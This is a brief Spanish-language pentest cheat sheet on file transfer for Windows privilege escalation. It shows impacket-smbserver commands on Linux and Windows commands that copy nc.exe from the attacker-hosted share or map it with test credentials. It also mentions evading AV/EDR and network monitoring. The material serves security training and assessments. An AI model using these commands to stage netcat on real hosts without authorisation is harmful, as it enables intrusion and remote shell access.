# Escalación de Privilegios en Windows

## Descripción
Comprender diferentes formas de realizar transferencias de archivos y cómo funcionan las redes puede ayudarnos a lograr nuestros objetivos durante una evaluación. Debemos ser conscientes de los controles del host que pueden impedir nuestras acciones, como la inclusión en listas blancas de aplicaciones o el bloqueo AV/EDR de aplicaciones o actividades específicas. Las transferencias de archivos también se ven afectadas por dispositivos de red como Firewalls, IDS o IPS que pueden monitorear o bloquear puertos particulares u operaciones poco comunes.

### Linux - Windows (smb no autenticado)

```python
sudo impacket-smbserver share -smb2support /tmp/smbshare (Linux)
copy \\192.168.220.133\share\nc.exe (windows)
```

### Linux - Windows (smb con autentificación)

```python
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test (Linux)
net use n: \\192.168.220.133\share /user:test test (windows)
```
